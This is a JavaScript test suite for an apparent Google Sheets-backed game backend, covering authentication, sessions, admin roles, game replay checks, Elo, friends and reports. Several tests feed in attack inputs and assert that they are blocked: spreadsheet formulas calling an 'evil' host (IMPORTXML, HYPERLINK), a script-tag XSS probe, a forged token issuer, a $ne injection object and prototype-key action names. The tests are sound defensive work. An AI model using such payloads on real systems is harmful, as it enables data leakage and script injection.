import test from 'node:test';
import assert from 'node:assert/strict';
import { createEnv, googleToken } from './harness.mjs';
import { playGame, recordPayload } from './game-helper.mjs';

const SECRET = 's'.repeat(40);

function fresh(props) {
  const env = createEnv(props);
  env.setup();
  return env;
}

function login(env, who = 'alice') {
  const email = `${who}@example.com`;
  const data = env.ok('auth.login', { idToken: googleToken({ email, sub: 'sub-' + who, name: who[0].toUpperCase() + who.slice(1) + ' Tester' }) });
  return { token: data.sessionToken, user: data.user, data };
}
const as = (token) => ({ sessionToken: token });
const server = { serverSecret: SECRET };

// ───────────────────────── setup / database ─────────────────────────

test('setup creates every sheet with headers and is idempotent', () => {
  const env = createEnv();
  const r1 = env.setup();
  assert.equal(r1.problems.length, 0);
  for (const name of ['Users', 'Games', 'GamePlayers', 'GameMoves', 'Leaderboard', 'Invitations', 'Sessions', 'AuthSessions', 'Friends', 'Achievements', 'Reports', 'AdminAudit', 'Logs']) {
    assert.ok(env.sheets.get(name), `${name} sheet exists`);
    assert.ok(env.sheets.get(name).data[0].length >= 3, `${name} has headers`);
  }
  env.ok('auth.login', { idToken: googleToken() });
  env.setup(); // second run must not wipe data
  assert.equal(env.sheets.get('Users').data.length, 2);
  assert.equal(env.triggers.length, 1, 'maintenance trigger installed once');
});

test('setup reports missing configuration', () => {
  const env = createEnv({ GOOGLE_CLIENT_ID: '', SERVER_SECRET: 'short', ADMIN_EMAILS: '' });
  const r = env.setup();
  assert.equal(r.problems.length, 3);
});

test('requests fail clearly when the database was never initialised', () => {
  const env = createEnv();
  const r = env.call('auth.login', { idToken: googleToken() });
  assert.equal(r.error.code, 'DB_NOT_INITIALISED');
});

// ───────────────────────── Google authentication ─────────────────────────

test('first login registers the user, returning login reuses the account', () => {
  const env = fresh();
  const a = login(env);
  assert.equal(a.data.isNew, true);
  assert.match(a.user.id, /^P[0-9a-f]{14}$/);
  assert.equal(a.user.email, 'alice@example.com');
  assert.equal(a.user.displayName, 'Alice Tester');
  assert.equal(a.user.rating, 1000);
  assert.equal(a.user.role, 'player');
  assert.equal(a.user.status, 'active');

  env.advance(60_000);
  const b = login(env);
  assert.equal(b.data.isNew, false);
  assert.equal(b.user.id, a.user.id, 'same Player ID');
  assert.notEqual(b.token, a.token, 'a new session token per login');
  assert.equal(env.sheets.get('Users').data.length, 2, 'no duplicate registration');
  assert.ok(Date.parse(b.user.lastLogin) > Date.parse(a.user.lastLogin), 'lastLogin updated');
  assert.equal(b.user.createdAt, a.user.createdAt, 'createdAt preserved');
});

test('same Google account with a changed e-mail is not duplicated (matched on stable sub)', () => {
  const env = fresh();
  const a = env.ok('auth.login', { idToken: googleToken({ sub: 'S1', email: 'old@example.com' }) });
  const b = env.ok('auth.login', { idToken: googleToken({ sub: 'S1', email: 'new@example.com' }) });
  assert.equal(a.user.id, b.user.id);
});

test('the browser cannot choose its identity: e-mail/playerId fields in the request are ignored', () => {
  const env = fresh();
  const a = login(env, 'alice');
  const r = env.call('auth.login', { idToken: googleToken({ email: 'mallory@example.com', sub: 'sub-m' }), email: 'alice@example.com', playerId: a.user.id });
  assert.equal(r.ok, true);
  assert.notEqual(r.data.user.id, a.user.id);
  assert.equal(r.data.user.email, 'mallory@example.com');
});

test('invalid Google tokens are rejected', () => {
  const env = fresh();
  const bad = (claims, code) => assert.equal(env.call('auth.login', { idToken: googleToken(claims) }).error.code, code);
  bad({ aud: 'someone-elses-client' }, 'AUTH_WRONG_AUDIENCE');
  bad({ iss: 'https://evil.example.com' }, 'AUTH_INVALID_TOKEN');
  bad({ exp: String(Math.floor(Date.parse('2026-11-22T09:00:00Z') / 1000)) }, 'AUTH_EXPIRED');
  bad({ email_verified: 'false' }, 'AUTH_EMAIL_UNVERIFIED');
  bad({ sub: '' }, 'AUTH_INVALID_TOKEN');
  assert.equal(env.call('auth.login', { idToken: 'not-a-jwt' }).error.code, 'AUTH_INVALID_TOKEN');
  assert.equal(env.call('auth.login', {}).error.code, 'VALIDATION');
  assert.equal(env.call('auth.login', { idToken: googleToken({ __status: 400 }) }).error.code, 'AUTH_INVALID_TOKEN', 'Google says 400');
  assert.equal(env.call('auth.login', { idToken: googleToken({ __status: 503 }) }).error.code, 'AUTH_UNAVAILABLE', 'Google outage is transient');
  assert.equal(env.sheets.get('Users').data.length, 1, 'no user created by failed logins');
});

test('optional e-mail domain allow-list', () => {
  const env = fresh({ ALLOWED_EMAIL_DOMAINS: 'school.edu' });
  assert.equal(env.call('auth.login', { idToken: googleToken({ email: 'x@gmail.com' }) }).error.code, 'AUTH_DOMAIN_NOT_ALLOWED');
  assert.equal(env.call('auth.login', { idToken: googleToken({ email: 'x@school.edu' }) }).ok, true);
});

test('the ID token is verified with Google (audience, issuer, expiry), not just decoded', () => {
  const env = fresh();
  login(env);
  assert.ok(env.fetchLog.some((f) => f.url.startsWith('https://oauth2.googleapis.com/tokeninfo?id_token=')));
});

test('hostile Google display names are neutralised', () => {
  const env = fresh();
  const r = env.ok('auth.login', { idToken: googleToken({ email: 'e@example.com', sub: 'e', name: '=HYPERLINK("http://evil","x")' }) });
  assert.ok(!r.user.displayName.startsWith('='));
  const r2 = env.ok('auth.login', { idToken: googleToken({ email: 'f@example.com', sub: 'f', name: '<script>alert(1)</script>' }) });
  assert.ok(!/[<>]/.test(r2.user.displayName));
});

test('only a hash of the session token is stored', () => {
  const env = fresh();
  const a = login(env);
  const stored = JSON.stringify(env.sheets.get('AuthSessions').data);
  assert.ok(!stored.includes(a.token));
});

// ───────────────────────── sessions ─────────────────────────

test('session lifecycle: me → logout → rejected', () => {
  const env = fresh();
  const { token } = login(env);
  assert.equal(env.ok('auth.me', {}, as(token)).user.email, 'alice@example.com');
  env.ok('auth.logout', {}, as(token));
  assert.equal(env.call('auth.me', {}, as(token)).error.code, 'AUTH_EXPIRED');
});

test('missing, malformed and forged tokens are rejected', () => {
  const env = fresh();
  const { token } = login(env);
  assert.equal(env.call('auth.me', {}).error.code, 'AUTH_REQUIRED');
  assert.equal(env.call('auth.me', {}, as('x'.repeat(64))).error.code, 'AUTH_EXPIRED');
  assert.equal(env.call('auth.me', {}, as(token.slice(0, -1) + (token.endsWith('a') ? 'b' : 'a'))).error.code, 'AUTH_EXPIRED');
  assert.equal(env.call('auth.me', {}, as({ $ne: 1 })).error.code, 'AUTH_REQUIRED');
});

test('sessions expire and are extended (sliding) when more than half the lifetime has passed', () => {
  const env = fresh({ SESSION_TTL_HOURS: '24' });
  const { token } = login(env);
  env.advance(13 * 3600_000);
  const me = env.ok('auth.me', {}, as(token));
  env.advance(13 * 3600_000); // 26h after login: dead without the extension
  assert.equal(env.ok('auth.me', {}, as(token)).user.id, me.user.id, 'sliding expiry kept it alive');
  env.advance(25 * 3600_000);
  assert.equal(env.call('auth.me', {}, as(token)).error.code, 'AUTH_EXPIRED');
});

test('logoutAll revokes every session of the player', () => {
  const env = fresh();
  const a = login(env);
  const b = login(env);
  env.ok('auth.logoutAll', {}, as(a.token));
  assert.equal(env.call('auth.me', {}, as(b.token)).error.code, 'AUTH_EXPIRED');
});

test('at most 8 live sessions per player', () => {
  const env = fresh();
  const tokens = [];
  for (let i = 0; i < 10; i++) { env.advance(1000); tokens.push(login(env).token); }
  assert.equal(env.call('auth.me', {}, as(tokens[0])).ok, false);
  assert.equal(env.call('auth.me', {}, as(tokens[9])).ok, true);
});

test('suspended accounts cannot log in and live sessions die immediately', () => {
  const env = fresh();
  const admin = login(env, 'boss');
  const victim = login(env, 'victim');
  env.ok('admin.setUserStatus', { playerId: victim.user.id, status: 'suspended', reason: 'abuse' }, as(admin.token));
  assert.equal(env.call('auth.me', {}, as(victim.token)).error.code, 'AUTH_EXPIRED');
  const r = env.call('auth.login', { idToken: googleToken({ email: 'victim@example.com', sub: 'sub-victim' }) });
  assert.equal(r.error.code, 'ACCOUNT_SUSPENDED');
  env.ok('admin.setUserStatus', { playerId: victim.user.id, status: 'active' }, as(admin.token));
  assert.equal(env.call('auth.login', { idToken: googleToken({ email: 'victim@example.com', sub: 'sub-victim' }) }).ok, true);
});

// ───────────────────────── profile ─────────────────────────

test('profile update: display name, language, avatar', () => {
  const env = fresh();
  const { token } = login(env);
  const r = env.ok('users.updateProfile', { displayName: '  Snake Master_7 ', language: 'bn', avatar: 'crown' }, as(token));
  assert.equal(r.user.displayName, 'Snake Master_7');
  assert.equal(r.user.language, 'bn');
  assert.equal(r.user.avatar, 'crown');
  assert.equal(env.ok('auth.me', {}, as(token)).user.displayName, 'Snake Master_7');
});

test('profile update validation', () => {
  const env = fresh();
  const { token } = login(env);
  const bad = (p) => assert.equal(env.call('users.updateProfile', p, as(token)).error.code, 'VALIDATION', JSON.stringify(p));
  bad({ displayName: 'x' });
  bad({ displayName: 'a'.repeat(30) });
  bad({ displayName: '=1+1' });
  bad({ displayName: 'ok<b>' });
  bad({ displayName: 5 });
  bad({ language: 'fr' });
  bad({ avatar: 'https://evil.example/x.png' });
  bad({});
  // role/rating/email cannot be edited through the profile endpoint
  const r = env.ok('users.updateProfile', { displayName: 'Fine Name', role: 'admin', rating: 9999, email: 'x@y.z', status: 'active' }, as(token));
  assert.equal(r.user.role, 'player');
  assert.equal(r.user.rating, 1000);
  assert.equal(r.user.email, 'alice@example.com');
});

test('account deletion removes the user and sessions', () => {
  const env = fresh();
  const { token, user } = login(env);
  assert.equal(env.call('users.deleteAccount', {}, as(token)).error.code, 'VALIDATION');
  env.ok('users.deleteAccount', { confirm: 'DELETE' }, as(token));
  assert.equal(env.call('auth.me', {}, as(token)).ok, false);
  assert.equal(env.sheets.get('Users').data.length, 1);
  assert.ok(!JSON.stringify(env.sheets.get('Users').data).includes(user.id));
});

// ───────────────────────── authorization ─────────────────────────

test('admin endpoints require a server-verified admin role', () => {
  const env = fresh();
  const player = login(env, 'alice');
  for (const a of ['admin.stats', 'admin.users', 'admin.games', 'admin.reports', 'admin.audit']) {
    assert.equal(env.call(a, {}, as(player.token)).error.code, 'FORBIDDEN', a);
    assert.equal(env.call(a, {}).error.code, 'AUTH_REQUIRED', a + ' anonymous');
  }
  // a client-supplied role claim changes nothing
  assert.equal(env.call('admin.stats', { role: 'admin' }, { ...as(player.token), role: 'admin' }).error.code, 'FORBIDDEN');

  const admin = login(env, 'boss');
  assert.equal(admin.user.role, 'admin');
  assert.equal(env.ok('admin.stats', {}, as(admin.token)).totalUsers, 2);
  assert.equal(env.ok('admin.users', {}, as(admin.token)).users.length, 2);
});

test('admin: suspend rules, role changes, audit trail', () => {
  const env = fresh();
  const admin = login(env, 'boss');
  const p = login(env, 'alice');
  assert.equal(env.call('admin.setUserStatus', { playerId: admin.user.id, status: 'suspended' }, as(admin.token)).error.code, 'FORBIDDEN');
  const promoted = env.ok('admin.setRole', { playerId: p.user.id, role: 'admin' }, as(admin.token));
  assert.equal(promoted.user.role, 'admin');
  assert.equal(env.call('admin.setUserStatus', { playerId: p.user.id, status: 'suspended' }, as(admin.token)).error.code, 'FORBIDDEN', 'admins cannot be suspended');
  assert.equal(env.call('admin.setRole', { playerId: admin.user.id, role: 'player' }, as(p.token)).error.code, 'FORBIDDEN', 'ADMIN_EMAILS admin cannot be demoted');
  env.ok('admin.setRole', { playerId: p.user.id, role: 'player' }, as(admin.token));
  const audit = env.ok('admin.audit', {}, as(admin.token)).audit;
  assert.ok(audit.length >= 2);
  assert.equal(env.call('admin.setUserStatus', { playerId: 'nope', status: 'suspended' }, as(admin.token)).error.code, 'NOT_FOUND');
  assert.equal(env.call('admin.setUserStatus', { playerId: p.user.id, status: 'banana' }, as(admin.token)).error.code, 'VALIDATION');
});

test('server.* actions require the shared secret', () => {
  const env = fresh();
  const { token } = login(env);
  assert.equal(env.call('server.verifySession', { sessionToken: token }).error.code, 'FORBIDDEN');
  assert.equal(env.call('server.verifySession', { sessionToken: token }, { serverSecret: 'wrong' }).error.code, 'FORBIDDEN');
  assert.equal(env.call('server.verifySession', { sessionToken: token }, as(token)).error.code, 'FORBIDDEN', 'a user session is not a server credential');
  const ok = env.ok('server.verifySession', { sessionToken: token }, server);
  assert.equal(ok.displayName, 'Alice Tester');
  assert.equal(ok.status, 'active');
  assert.ok(!('email' in ok), 'no e-mail leaves the backend towards the game server');
});

test('server secret not configured → refuse', () => {
  const env = fresh({ SERVER_SECRET: '' });
  assert.equal(env.call('server.verifySession', {}, server).error.code, 'SERVER_NOT_CONFIGURED');
});

test('server.verifySession rejects bad / expired / suspended sessions', () => {
  const env = fresh();
  const admin = login(env, 'boss');
  const v = login(env, 'victim');
  assert.equal(env.call('server.verifySession', { sessionToken: 'z'.repeat(64) }, server).error.code, 'AUTH_EXPIRED');
  env.ok('admin.setUserStatus', { playerId: v.user.id, status: 'suspended' }, as(admin.token));
  assert.equal(env.call('server.verifySession', { sessionToken: v.token }, server).ok, false);
});

// ───────────────────────── router robustness ─────────────────────────

test('router: unknown action, bad JSON, oversize body, prototype keys', () => {
  const env = fresh();
  assert.equal(env.call('nope.nothing', {}).error.code, 'UNKNOWN_ACTION');
  assert.equal(env.call('constructor', {}).error.code, 'UNKNOWN_ACTION');
  assert.equal(env.call('__proto__', {}).error.code, 'UNKNOWN_ACTION');
  assert.equal(env.call('', {}, { raw: '{not json' }).error.code, 'BAD_REQUEST');
  assert.equal(env.call('', {}, { raw: '' }).error.code, 'BAD_REQUEST');
  assert.equal(env.call('', {}, { raw: JSON.stringify({ action: 'auth.login', payload: { idToken: 'a'.repeat(700000) } }) }).error.code, 'PAYLOAD_TOO_LARGE');
  const health = JSON.parse(env.ctx.doGet().getContent());
  assert.deepEqual(Object.keys(health.data).sort(), ['service', 'version']);
});

test('an internal exception is logged and returned as a generic INTERNAL error', () => {
  const env = fresh();
  env.fetchHandler = () => { throw new TypeError('boom'); };
  const r = env.call('auth.login', { idToken: googleToken() });
  assert.equal(r.error.code, 'AUTH_UNAVAILABLE'); // network failures are mapped, not leaked
  env.run('ROUTES["x.boom"] = { fn: function(){ throw new Error("secret stack detail"); }, auth: "none" }');
  const r2 = env.call('x.boom');
  assert.equal(r2.error.code, 'INTERNAL');
  assert.ok(!JSON.stringify(r2).includes('secret stack detail'));
  assert.ok(env.sheets.get('Logs').data.some((row) => String(row[3]).includes('secret stack detail')), 'error logged in the Logs sheet');
});

test('lock contention surfaces as a retryable BUSY error', () => {
  const env = fresh();
  env.lockFailures = 1;
  assert.equal(env.call('auth.login', { idToken: googleToken() }).error.code, 'BUSY');
  assert.equal(env.call('auth.login', { idToken: googleToken() }).ok, true);
  assert.equal(env.lockHeld, false, 'lock released');
});

test('rate limiting: login and profile updates', () => {
  const env = fresh();
  let limited = 0;
  for (let i = 0; i < 15; i++) if (env.call('auth.login', { idToken: googleToken() }).error?.code === 'RATE_LIMITED') limited++;
  assert.ok(limited >= 3, 'repeated logins for one Google account are throttled');
  env.advance(61_000);
  const { token } = login(env, 'zed');
  let lim = 0;
  for (let i = 0; i < 25; i++) if (env.call('users.updateProfile', { displayName: 'Name ' + (i % 9) + 'x' }, as(token)).error?.code === 'RATE_LIMITED') lim++;
  assert.ok(lim > 0);
});

// ───────────────────────── games, Elo, leaderboard ─────────────────────────

function twoPlayers(env) {
  const a = login(env, 'alice');
  const b = login(env, 'bob');
  return { a, b };
}

test('online game: stats, Elo, achievements, history, leaderboard rank', () => {
  const env = fresh();
  const { a, b } = twoPlayers(env);
  const g = playGame({ players: 2, seed: 7 });
  assert.ok(g.winnerSeat >= 0);
  const winner = g.winnerSeat === 0 ? a : b;
  const loser = g.winnerSeat === 0 ? b : a;
  const payload = recordPayload(g, [a.user.id, b.user.id]);
  const res = env.ok('server.recordGame', payload, server);

  assert.equal(res.ratings[winner.user.id].before, 1000);
  assert.equal(res.ratings[winner.user.id].after, 1016);
  assert.equal(res.ratings[loser.user.id].after, 984);
  assert.ok(res.achievements[winner.user.id].includes('first_victory'));
  assert.ok(res.achievements[winner.user.id].includes('multiplayer_champion'));
  assert.ok(res.achievements[loser.user.id].includes('first_online'));
  assert.ok(!res.achievements[loser.user.id].includes('first_victory'));

  const w = env.ok('auth.me', {}, as(winner.token)).user;
  assert.deepEqual([w.gamesPlayed, w.wins, w.losses, w.rating, w.rank, w.currentStreak], [1, 1, 0, 1016, 1, 1]);
  const l = env.ok('auth.me', {}, as(loser.token)).user;
  assert.deepEqual([l.gamesPlayed, l.wins, l.losses, l.rating, l.rank], [1, 0, 1, 984, 2]);

  assert.equal(env.sheets.get('Games').data.length, 2);
  assert.equal(env.sheets.get('GamePlayers').data.length, 3);
  assert.equal(env.sheets.get('GameMoves').data.length, g.moves.length + 1);
  assert.equal(env.sheets.get('Leaderboard').data.length, 3);

  const hist = env.ok('games.history', {}, as(winner.token));
  assert.equal(hist.total, 1);
  assert.equal(hist.games[0].players[0].placement, 1);
  assert.equal(hist.games[0].mode, 'online');

  const lb = env.ok('leaderboard.get', { period: 'all' }, as(loser.token));
  assert.equal(lb.entries[0].id, winner.user.id);
  assert.equal(lb.me.rank, 2);
  assert.equal(env.ok('leaderboard.get', {}).entries.length, 2, 'anonymous users can read the global board');
  const week = env.ok('leaderboard.get', { period: 'weekly' });
  assert.equal(week.entries.length, 1);
  assert.equal(week.entries[0].periodWins, 1);
  assert.equal(env.call('leaderboard.get', { period: 'yearly' }).error.code, 'VALIDATION');
  assert.equal(env.call('leaderboard.get', { scope: 'friends' }).error.code, 'AUTH_REQUIRED');
});

test('recordGame is idempotent per gameId (no double counting)', () => {
  const env = fresh();
  const { a, b } = twoPlayers(env);
  const payload = recordPayload(playGame({ players: 2, seed: 3 }), [a.user.id, b.user.id]);
  env.ok('server.recordGame', payload, server);
  const again = env.ok('server.recordGame', payload, server);
  assert.equal(again.duplicate, true);
  assert.equal(env.ok('auth.me', {}, as(a.token)).user.gamesPlayed, 1);
  assert.equal(env.sheets.get('Games').data.length, 2);
});

test('recordGame replays the moves: forged winners, positions and dice are rejected', () => {
  const env = fresh();
  const { a, b } = twoPlayers(env);
  const g = playGame({ players: 2, seed: 11 });
  const ids = [a.user.id, b.user.id];
  const reject = (mutate, code) => {
    const p = recordPayload(g, ids);
    mutate(p);
    const r = env.call('server.recordGame', p, server);
    assert.equal(r.ok, false);
    assert.equal(r.error.code, code);
  };
  reject((p) => { p.winnerSeat = 1 - g.winnerSeat; p.players.forEach((x) => { x.placement = x.placement === 1 ? 2 : 1; }); }, 'REPLAY_INVALID');
  reject((p) => { p.players[0].finalPosition = 100; }, 'REPLAY_INVALID');
  reject((p) => { p.moves[5].dice = (p.moves[5].dice % 6) + 1; }, 'REPLAY_INVALID');
  reject((p) => { p.moves[2].seat = 1 - p.moves[2].seat; }, 'REPLAY_INVALID');
  reject((p) => { p.moves = p.moves.slice(0, 3); }, 'REPLAY_INVALID');
  reject((p) => { p.players[1].color = p.players[0].color; }, 'VALIDATION');
  reject((p) => { p.players[0].playerId = 'Pdoesnotexist1'; }, 'UNKNOWN_PLAYER');
  reject((p) => { p.players[0].placement = 1; p.players[1].placement = 1; }, 'VALIDATION');
  reject((p) => { p.moves = 'nope'; }, 'VALIDATION');
  reject((p) => { p.players = p.players.slice(0, 1); }, 'VALIDATION');
  assert.equal(env.ok('auth.me', {}, as(a.token)).user.gamesPlayed, 0, 'nothing was recorded');
});

test('forfeited game: loss recorded, rating untouched', () => {
  const env = fresh();
  const { a, b } = twoPlayers(env);
  const g = playGame({ players: 2, seed: 5, stopAfter: 12 });
  assert.equal(g.winnerSeat, -1);
  const payload = recordPayload({ ...g, winnerSeat: 0 }, [a.user.id, b.user.id], { forfeited: true });
  payload.players.forEach((p) => { p.placement = p.seat === 0 ? 1 : 2; });
  env.ok('server.recordGame', payload, server);
  const A = env.ok('auth.me', {}, as(a.token)).user;
  const B = env.ok('auth.me', {}, as(b.token)).user;
  assert.deepEqual([A.rating, B.rating], [1000, 1000]);
  assert.deepEqual([A.wins, B.losses], [1, 1]);
});

test('4-player game: winner gains vs average opposition, everyone else loses rating', () => {
  const env = fresh();
  const users = ['alice', 'bob', 'carol', 'dave'].map((n) => login(env, n));
  const g = playGame({ players: 4, seed: 21 });
  const res = env.ok('server.recordGame', recordPayload(g, users.map((u) => u.user.id)), server);
  const after = Object.values(res.ratings).map((r) => r.after).sort((x, y) => x - y);
  assert.equal(after[3], 1016);
  assert.deepEqual(after.slice(0, 3), [984, 984, 984]);
});

test('win streak and achievements accumulate across games', () => {
  const env = fresh();
  const { a, b } = twoPlayers(env);
  let seed = 100;
  const wins = [0, 0];
  for (let i = 0; i < 12; i++) {
    const g = playGame({ players: 2, seed: seed++ });
    wins[g.winnerSeat]++;
    env.ok('server.recordGame', recordPayload(g, [a.user.id, b.user.id]), server);
  }
  const A = env.ok('auth.me', {}, as(a.token)).user;
  assert.equal(A.gamesPlayed, 12);
  assert.equal(A.wins, wins[0]);
  assert.equal(A.wins + A.losses, 12);
  const ach = env.ok('achievements.list', {}, as(a.token)).achievements.filter((x) => x.unlockedAt).map((x) => x.id);
  assert.ok(ach.includes('games_10'));
  assert.equal(env.sheets.get('Achievements').data.length - 1, new Set(env.sheets.get('Achievements').data.slice(1).map((r) => r.join('|'))).size, 'achievements never duplicate');
});

test('practice games are replay-checked, counted separately, never ranked', () => {
  const env = fresh();
  const { token } = login(env);
  const g = playGame({ players: 2, seed: 9 });
  const players = [{ name: 'Alice', color: 'red', isAI: false }, { name: 'Computer', color: 'green', isAI: true }];
  const r = env.ok('games.reportPractice', { mode: 'ai', players, moves: g.moves, mySeat: 0 }, as(token));
  assert.equal(r.user.rating, 1000);
  assert.equal(r.user.gamesPlayed, 0, 'online counters untouched');
  assert.equal(r.user.practiceGames, 1);
  assert.equal(r.user.practiceWins, g.winnerSeat === 0 ? 1 : 0);
  assert.equal(env.sheets.get('Leaderboard').data.length, 1);
  assert.equal(env.ok('leaderboard.get', {}).entries.length, 0);

  const bad = (mut, code) => {
    const mv = JSON.parse(JSON.stringify(g.moves));
    mut(mv);
    const e = env.call('games.reportPractice', { mode: 'ai', players, moves: mv, mySeat: 0 }, as(token));
    assert.equal(e.error?.code, code);
  };
  env.advance(61_000);
  bad((mv) => { mv.splice(0, mv.length - 3); }, 'VALIDATION');
  bad((mv) => { mv[mv.length - 1].dice = (mv[mv.length - 1].dice % 6) + 1; }, 'REPLAY_INVALID');
  bad((mv) => { mv.pop(); }, 'REPLAY_INVALID');
  assert.equal(env.call('games.reportPractice', { mode: 'online', players, moves: g.moves }, as(token)).error.code, 'VALIDATION');
  assert.equal(env.call('games.reportPractice', { mode: 'ai', players, moves: g.moves, mySeat: 1 }, as(token)).error.code, 'VALIDATION', 'seat must be human');
});

test('active game sessions are tracked and visible to admins only', () => {
  const env = fresh();
  const admin = login(env, 'boss');
  const { a, b } = twoPlayers(env);
  env.ok('server.gameStarted', { gameId: 'game-live-1', roomCode: 'ABC234', players: [{ playerId: a.user.id, name: 'Alice' }, { playerId: b.user.id, name: 'Bob' }], serverId: 'srv1' }, server);
  env.ok('server.gameStarted', { gameId: 'game-live-1', roomCode: 'ABC234', players: [] }, server); // idempotent
  assert.equal(env.sheets.get('Sessions').data.length, 2);
  assert.equal(env.ok('admin.stats', {}, as(admin.token)).activeGames, 1);
  assert.equal(env.ok('admin.games', {}, as(admin.token)).activeSessions.length, 1);
  assert.equal(env.call('admin.games', {}, as(a.token)).error.code, 'FORBIDDEN');
  const g = playGame({ players: 2, seed: 4 });
  env.ok('server.recordGame', recordPayload(g, [a.user.id, b.user.id], { gameId: 'game-live-1' }), server);
  assert.equal(env.ok('admin.stats', {}, as(admin.token)).activeGames, 0);
  assert.equal(env.sheets.get('Sessions').data[1][2], 'completed');
  env.ok('server.gameStarted', { gameId: 'game-live-2', roomCode: 'XYZ234', players: [] }, server);
  env.ok('server.gameAborted', { gameId: 'game-live-2' }, server);
  assert.equal(env.sheets.get('Sessions').data[2][2], 'aborted');
  env.advance(7 * 3600_000);
  env.ok('server.gameStarted', { gameId: 'game-stale', roomCode: 'XYZ999', players: [] }, server);
  env.advance(7 * 3600_000);
  assert.equal(env.ok('admin.stats', {}, as(admin.token)).activeGames, 0, 'stale sessions are not "active"');
});

// ───────────────────────── friends & invitations ─────────────────────────

test('friends: request → accept → list → remove, plus invitations', () => {
  const env = fresh();
  const { a, b } = twoPlayers(env);
  const c = login(env, 'carol');
  assert.equal(env.call('server.createInvite', { fromPlayerId: a.user.id, toPlayerId: b.user.id, roomCode: 'ABC234' }, server).error.code, 'NOT_FRIENDS');
  assert.equal(env.call('friends.request', { playerId: a.user.id }, as(a.token)).error.code, 'VALIDATION');
  assert.equal(env.call('friends.request', { playerId: 'Pnothing' }, as(a.token)).error.code, 'NOT_FOUND');
  assert.equal(env.ok('friends.request', { playerId: b.user.id }, as(a.token)).status, 'pending');
  assert.equal(env.call('friends.request', { playerId: b.user.id }, as(a.token)).error.code, 'ALREADY_REQUESTED');
  const inc = env.ok('friends.list', {}, as(b.token));
  assert.equal(inc.incoming.length, 1);
  assert.equal(env.ok('friends.list', {}, as(a.token)).sent.length, 1);
  // only the addressee can answer
  assert.equal(env.call('friends.respond', { friendshipId: inc.incoming[0].friendshipId, accept: true }, as(c.token)).error.code, 'FORBIDDEN');
  assert.equal(env.call('friends.respond', { friendshipId: inc.incoming[0].friendshipId, accept: true }, as(a.token)).error.code, 'FORBIDDEN');
  env.ok('friends.respond', { friendshipId: inc.incoming[0].friendshipId, accept: true }, as(b.token));
  assert.equal(env.ok('friends.list', {}, as(a.token)).friends[0].id, b.user.id);
  assert.equal(env.call('friends.request', { playerId: b.user.id }, as(a.token)).error.code, 'ALREADY_FRIENDS');

  const inv = env.ok('server.createInvite', { fromPlayerId: a.user.id, toPlayerId: b.user.id, roomCode: 'ABC234' }, server);
  assert.equal(inv.fromName, 'Alice Tester');
  assert.equal(env.ok('server.createInvite', { fromPlayerId: a.user.id, toPlayerId: b.user.id, roomCode: 'ABC234' }, server).duplicate, true);
  const list = env.ok('invites.list', {}, as(b.token)).invites;
  assert.equal(list.length, 1);
  assert.equal(list[0].from.displayName, 'Alice Tester');
  assert.equal(env.ok('invites.list', {}, as(c.token)).invites.length, 0, 'invites are private');
  assert.equal(env.call('invites.respond', { inviteId: inv.inviteId, accept: true }, as(c.token)).error.code, 'FORBIDDEN');
  const acc = env.ok('invites.respond', { inviteId: inv.inviteId, accept: true }, as(b.token));
  assert.equal(acc.roomCode, 'ABC234');
  assert.equal(env.call('invites.respond', { inviteId: inv.inviteId, accept: true }, as(b.token)).error.code, 'INVITE_CLOSED');

  // friends leaderboard scope
  const g = playGame({ players: 2, seed: 2 });
  env.ok('server.recordGame', recordPayload(g, [a.user.id, b.user.id]), server);
  const fl = env.ok('leaderboard.get', { scope: 'friends' }, as(a.token));
  assert.equal(fl.entries.length, 2);
  assert.equal(env.ok('leaderboard.get', { scope: 'friends' }, as(c.token)).entries.length, 0);

  env.ok('friends.remove', { playerId: b.user.id }, as(a.token));
  assert.equal(env.ok('friends.list', {}, as(a.token)).friends.length, 0);
});

test('invitations expire', () => {
  const env = fresh();
  const { a, b } = twoPlayers(env);
  env.ok('friends.request', { playerId: b.user.id }, as(a.token));
  env.ok('friends.respond', { friendshipId: env.ok('friends.list', {}, as(b.token)).incoming[0].friendshipId, accept: true }, as(b.token));
  const inv = env.ok('server.createInvite', { fromPlayerId: a.user.id, toPlayerId: b.user.id, roomCode: 'ROOM22' }, server);
  env.advance(11 * 60_000);
  assert.equal(env.ok('invites.list', {}, as(b.token)).invites.length, 0);
  assert.equal(env.call('invites.respond', { inviteId: inv.inviteId, accept: true }, as(b.token)).error.code, 'INVITE_EXPIRED');
});

// ───────────────────────── reports & maintenance ─────────────────────────

test('technical reports: submit by users, review by admins', () => {
  const env = fresh();
  const admin = login(env, 'boss');
  const p = login(env, 'alice');
  const r = env.ok('reports.submit', { kind: 'bug', message: 'Dice froze on my phone', context: 'Android Chrome' }, as(p.token));
  assert.equal(env.call('reports.submit', { message: 'x' }, as(p.token)).error.code, 'VALIDATION');
  assert.equal(env.call('admin.reports', {}, as(p.token)).error.code, 'FORBIDDEN');
  const open = env.ok('admin.reports', {}, as(admin.token)).reports;
  assert.equal(open.length, 1);
  assert.equal(open[0].reporter.displayName, 'Alice Tester');
  assert.equal(env.ok('admin.stats', {}, as(admin.token)).openReports, 1);
  env.ok('admin.resolveReport', { reportId: r.reportId, resolution: 'Fixed in 1.0.1' }, as(admin.token));
  assert.equal(env.ok('admin.reports', {}, as(admin.token)).reports.length, 0);
  assert.equal(env.ok('admin.reports', { status: 'resolved' }, as(admin.token)).reports.length, 1);
});

test('spreadsheet formula injection through free text is neutralised', () => {
  const env = fresh();
  const p = login(env, 'alice');
  env.ok('reports.submit', { kind: 'bug', message: '=IMPORTXML("http://evil/x","//a")' }, as(p.token));
  const cell = env.sheets.get('Reports').data[1][3];
  assert.ok(cell.startsWith("'="), 'prefixed so Sheets treats it as text');
});

test('maintenance purges expired sessions and old invitations', () => {
  const env = fresh({ SESSION_TTL_HOURS: '1' });
  login(env);
  env.advance(3 * 86400_000);
  const r = env.run('maintenance()');
  assert.equal(r.sessionsPurged, 1);
  assert.equal(env.sheets.get('AuthSessions').data.length, 1);
});

test('leaderboard ties and ranking use only active, non-admin players with games', () => {
  const env = fresh();
  const admin = login(env, 'boss');
  const { a, b } = twoPlayers(env);
  const g = playGame({ players: 2, seed: 8 });
  env.ok('server.recordGame', recordPayload(g, [a.user.id, b.user.id]), server);
  const winner = g.winnerSeat === 0 ? a : b;
  env.ok('admin.setUserStatus', { playerId: winner.user.id, status: 'suspended' }, as(admin.token));
  const lb = env.ok('leaderboard.get', {});
  assert.ok(lb.entries.every((e) => e.id !== winner.user.id), 'suspended players leave the board');
  assert.ok(lb.entries.every((e) => e.id !== admin.user.id));
});
